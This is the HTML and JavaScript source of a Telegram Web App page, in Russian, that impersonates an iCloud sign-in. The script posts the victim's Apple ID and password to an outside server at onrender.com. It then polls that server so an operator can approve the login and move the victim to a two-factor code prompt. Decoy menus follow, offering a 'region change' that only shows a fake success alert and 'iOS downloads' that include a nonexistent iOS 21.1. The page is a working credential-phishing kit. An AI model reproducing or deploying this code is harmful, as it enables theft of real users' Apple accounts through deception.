<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iCloud Services</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; padding-top: 50px; background-color: #f5f5f7; }
        .login-form { width: 300px; display: flex; flex-direction: column; gap: 15px; background: white; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        h2 { text-align: center; font-size: 20px; margin-bottom: 10px; }
        input { padding: 12px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 16px; outline: none; }
        button { padding: 12px; background: #007aff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: 500; }
        button:hover { background: #0063cc; }
        button.secondary { background: #f5f5f7; color: #007aff; border: 1px solid #007aff; }
        .grid-countries { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .loader { text-align: center; display: none; flex-direction: column; gap: 10px; }
    </style>
</head>
<body>

<div class="login-form" id="auth-step">
    <h2>Вход в iCloud</h2>
    <input type="text" id="email" placeholder="Apple ID">
    <input type="password" id="password" placeholder="Пароль">
    <button onclick="handleLogin()">Войти</button>
</div>

<div class="login-form loader" id="wait-step">
    <h2>Проверка...</h2>
    <p>Пожалуйста, подождите, пока система проверяет ваши данные.</p>
</div>

<div class="login-form" id="2fa-step" style="display:none;">
    <h2>Двухфакторная проверка</h2>
    <input type="text" id="code" placeholder="Код из 6 цифр" maxlength="6">
    <button onclick="send2FA()">Подтвердить</button>
</div>

<div class="login-form" id="menu-step" style="display:none;">
    <h2>Что вы хотите сделать?</h2>
    <button onclick="showStep('region-step')">Быстро сменить регион</button>
    <button class="secondary" onclick="showStep('ios-step')">Скачать iOS</button>
</div>

<div class="login-form" id="region-step" style="display:none;">
    <h2>Выберите страну</h2>
    <div class="grid-countries">
        <button class="secondary" onclick="confirmRegion('Германия')">Германия</button>
        <button class="secondary" onclick="confirmRegion('Россия')">Россия</button>
        <button class="secondary" onclick="confirmRegion('США')">США</button>
        <button class="secondary" onclick="confirmRegion('Франция')">Франция</button>
    </div>
    <button onclick="showStep('menu-step')">Назад</button>
</div>

<div class="login-form" id="ios-step" style="display:none;">
    <h2>Выберите версию iOS</h2>
    <button onclick="downloadFile('16')">iOS 16</button>
    <button onclick="downloadFile('17')">iOS 17</button>
    <button onclick="downloadFile('18')">iOS 18</button>
    <button onclick="downloadFile('21.1')">iOS 21.1</button>
    <button class="secondary" onclick="showStep('menu-step')">Назад</button>
</div>

<script>
    const tg = window.Telegram.WebApp;
    const API_URL = 'https://sever-afk3.onrender.com';
    let currentUserId = null;
    let pollInterval = null;

    function showStep(stepId) {
        document.querySelectorAll('.login-form').forEach(el => el.style.display = 'none');
        document.getElementById(stepId).style.display = 'flex';
    }

    async function handleLogin() {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('password').value;
        if (!email.includes('@')) return alert('Введите корректный Apple ID');

        currentUserId = 'ID_' + Math.floor(Math.random() * 1000000);
        showStep('wait-step');

        // Отправляем данные на сервер
        await fetch(`${API_URL}/send-data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ userId: currentUserId, email, pass })
        });

        // Начинаем спрашивать сервер: "Что решил админ?"
        pollInterval = setInterval(checkAuthStatus, 3000);
    }

    async function checkAuthStatus() {
        const res = await fetch(`${API_URL}/check-status/${currentUserId}`);
        const data = await res.json();

        if (data.status === 'success') {
            clearInterval(pollInterval);
            showStep('2fa-step');
        } else if (data.status === 'error') {
            clearInterval(pollInterval);
            alert("Ошибка: Неверный логин или пароль");
            location.reload();
        }
    }

    function confirmRegion(name) {
        alert("смена региона-успешно");
        showStep('menu-step');
    }

    function downloadFile(ver) {
        const link = document.createElement('a');
        link.href = 'ios.ipsw'; // Убедись, что файл лежит в корне или укажи URL
        link.download = `iOS_${ver}.ipsw`;
        link.click();
        tg.showAlert(`Загрузка iOS ${ver} началась`);
    }

    async function send2FA() {
        const code = document.getElementById('code').value;
        // Здесь можно добавить такую же проверку ✅/❌ для 2FA, если нужно
        showStep('menu-step');
    }
</script>
</body>
</html>
